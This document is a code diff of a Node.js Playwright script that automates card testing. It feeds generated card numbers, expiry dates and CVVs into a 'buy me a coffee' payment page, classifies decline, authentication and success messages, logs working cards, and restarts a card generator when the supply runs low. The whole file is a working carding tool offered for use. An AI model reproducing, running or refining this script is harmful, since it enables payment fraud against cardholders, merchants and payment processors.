@@ -1,75 +1,35 @@
-const { chromium } = require('playwright');
 const fs = require('fs');
-const readline = require('readline');
-const { spawn, exec } = require('child_process');
+const { exec } = require('child_process');
+const { chromium } = require('playwright');
 
-// Function to read cards from cards.txt in the specified format
-function readCardsFromFile(filePath) {
-    const cards = [];
-    const data = fs.readFileSync(filePath, 'utf8');
-
-    data.split('\n').forEach((line) => {
-        const parts = line.split('|');
-        if (parts.length === 4) {
-            const card = {
-                number: parts[0],
-                expiry_month: parts[1],
-                expiry_year: parts[2],
-                cvv: parts[3]
-            };
-            cards.push(card);
-        }
-    });
-    return cards;
-}
-
-// Function to save remaining cards to cards.txt
-function saveCardsToFile(filePath, cards) {
-    const data = cards.map(card => `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}`).join('\n');
-    fs.writeFileSync(filePath, data, 'utf8');
-}
-
-// Function to log successful payments to a text file
+// Helper function to log successful cards
 function logSuccessfulPayment(card) {
-    const successfulCardInfo = `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}\n`;
-    fs.appendFileSync('successful_payments.txt', successfulCardInfo);
-    console.log(`✅ Card saved to successful_payments.txt: ${successfulCardInfo.trim()}`);
+    const entry = `${card.number},${card.expiry_month}/${card.expiry_year},${card.cvv}\n`;
+    fs.appendFileSync('cards.txt', entry, 'utf8');
+    console.log("✅ Card saved to cards.txt.");
 }
 
-// Function to start the card generator in the background
-let cardGeneratorProcess = null;
-function startCardGenerator() {
-    if (!cardGeneratorProcess) {
-        console.log("⚙️ Starting card generator...");
-        cardGeneratorProcess = spawn('python3', ['cardgenerater.py'], { detached: true });
-    }
-}
+// Helper function to monitor card availability
+function monitorCardFile() {
+    const stats = fs.statSync('cards.txt');
+    const lines = fs.readFileSync('cards.txt', 'utf-8').split('\n').filter(Boolean);
 
-// Function to stop the card generator process
-function stopCardGenerator() {
-    if (cardGeneratorProcess) {
-        console.log("🛑 Stopping card generator...");
-        process.kill(-cardGeneratorProcess.pid);
-        cardGeneratorProcess = null;
-    }
-}
-
-// Monitor cards.txt and manage card generation
-function monitorCardsFile() {
-    fs.watch('cards.txt', (eventType, filename) => {
-        if (eventType === 'change') {
-            const cardCount = readCardsFromFile('cards.txt').length;
-
-            if (cardCount <= 50) {
-                startCardGenerator(); // Start generating cards if below threshold
-            } else if (cardCount >= 1000000) {
-                stopCardGenerator(); // Stop generating cards when threshold is reached
+    if (lines.length <= 50) {
+        console.log("⚠️ Only 50 cards left. Starting card generator...");
+        exec('python cardgenerater.py', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Error starting card generator: ${error.message}`);
+                return;
             }
-        }
-    });
+            console.log(`Card generator started:\n${stdout}`);
+        });
+    } else if (lines.length >= 1000000) {
+        console.log("✅ Card limit reached. Stopping card generator...");
+        exec('pkill -f cardgenerater.py'); // Stops the generator if it's running
+    }
 }
 
-// Automate browser interaction for payment simulation
+// Function to simulate the payment process
 async function simulatePayment(card, influencerUrl, gmailAddress) {
     const browser = await chromium.launch({
         headless: true,
@@ -110,32 +70,29 @@ async function simulatePayment(card, influencerUrl, gmailAddress) {
 
         const bodyContent = await page.textContent('body');
 
+        // Check for common payment failures
+        if (bodyContent.includes("Your card has been declined.")) {
+            console.log("❌ Card declined.");
+            await browser.close();
+            return { success: false, reason: "Card declined" };
+        }
+
         if (bodyContent.includes("Your card number is incorrect.")) {
             console.log("❌ Card number is incorrect.");
             await browser.close();
             return { success: false, reason: "Card number is incorrect" };
         }
 
-        if (bodyContent.includes("Your card was declined")) {
-            console.log("❌ Card was declined.");
+        if (bodyContent.includes("We are unable to authenticate your payment method.") || 
+            bodyContent.includes("Authentication Failed")) {
+            console.log("❌ Authentication failed.");
             await browser.close();
-            return { success: false, reason: "Card was declined" };
+            return { success: false, reason: "Authentication failed" };
         }
 
-        if (
-            bodyContent.includes("We are unable to authenticate your payment method.") ||
-            bodyContent.includes("Authentication Failed")
-        ) {
-            console.log("❌ Authentication failed or card declined.");
-            await browser.close();
-            return { success: false, reason: "Authentication failed or card declined" };
-        }
-
-        if (
-            bodyContent.includes("You bought") &&
-            bodyContent.includes("a coffee!") &&
-            bodyContent.includes("Thank you for supporting")
-        ) {
+        // Check for success messages on the page
+        if (bodyContent.includes("Thank you for supporting") || 
+            (bodyContent.includes("You bought") && bodyContent.includes("a coffee!"))) {
             logSuccessfulPayment(card);
             await browser.close();
             return { success: true, reason: "Payment successful" };
@@ -151,38 +108,31 @@ async function simulatePayment(card, influencerUrl, gmailAddress) {
     }
 }
 
-// Main function to run the script
+// Main function to load cards and simulate payments
 async function main() {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
+    monitorCardFile(); // Check card availability before starting
 
-    rl.question('Enter your Gmail address: ', async (gmailAddress) => {
-        rl.question('Enter the influencer URL: ', async (influencerUrl) => {
-            monitorCardsFile(); // Start monitoring cards.txt
-            let cards = readCardsFromFile('cards.txt');
-
-            for (const card of cards) {
-                const result = await simulatePayment(card, influencerUrl, gmailAddress);
-
-                if (result.success) {
-                    console.log(`✅ Payment successful: ${result.reason}`);
-                } else {
-                    console.log(`❌ Payment failed: ${result.reason}`);
-                }
-
-                cards = cards.filter(c => c.number !== card.number);
-                saveCardsToFile('cards.txt', cards);
-
-                const delay = Math.floor(Math.random() * 6) + 10;
-                await new Promise(resolve => setTimeout(resolve, delay * 1000));
-            }
-
-            rl.close();
+    const cards = fs.readFileSync('cards.txt', 'utf-8')
+        .split('\n')
+        .filter(Boolean)
+        .map(line => {
+            const [number, expiry, cvv] = line.split(',');
+            const [expiry_month, expiry_year] = expiry.split('/');
+            return { number, expiry_month, expiry_year, cvv };
         });
-    });
+
+    const influencerUrl = 'https://your-influencer-url.com';
+    const gmailAddress = 'your-email@gmail.com';
+
+    for (const card of cards) {
+        const result = await simulatePayment(card, influencerUrl, gmailAddress);
+
+        if (result.success) {
+            console.log(`✅ Payment successful with card: ${card.number}`);
+        } else {
+            console.log(`❌ Payment failed: ${result.reason}`);
+        }
+    }
 }
 
-// Run the main function
 main();
